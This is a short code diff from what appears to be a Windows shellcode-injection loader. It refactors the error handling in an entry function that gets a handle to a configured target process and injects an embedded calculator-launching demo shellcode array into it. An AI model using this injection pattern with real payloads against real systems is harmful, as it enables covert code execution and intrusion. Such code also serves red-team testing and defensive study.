@@ -20,22 +20,20 @@ VOID entry(void)
 		0x34,0xae,0x48,0x01,0xf7,0x99,0xff,0xd7
 	}; // win-exec-calc-shellcode.bin
 
-	BOOL result = FALSE;
 	DWORD pid = 0;
 	HANDLE process_handle = NULL;
 
 	if (!enumerate::GetProcessHandle(CONFIG_EXECUTION_TARGET_NAME, &pid, &process_handle))
 	{
 		LOG_ERROR("Error getting process handle.");
-		result = FALSE;
+		return;
 	}
-	else
-	{
-		LOG_INFO("Obtained PID of %s. (PID: %d)", CONFIG_EXECUTION_TARGET_NAME, pid);
-	}
+	LOG_INFO("Obtained PID of %s. (PID: %d)", CONFIG_EXECUTION_TARGET_NAME, pid);
 
-	ExecuteShellcode((HANDLE)process_handle, shellcode);
-	result = TRUE;
+	if (!ExecuteShellcode((HANDLE)process_handle, shellcode))
+	{
+		LOG_ERROR("Failed to execute shellcode.");
+	}
 }
 
 #pragma region [alternate entrypoints]
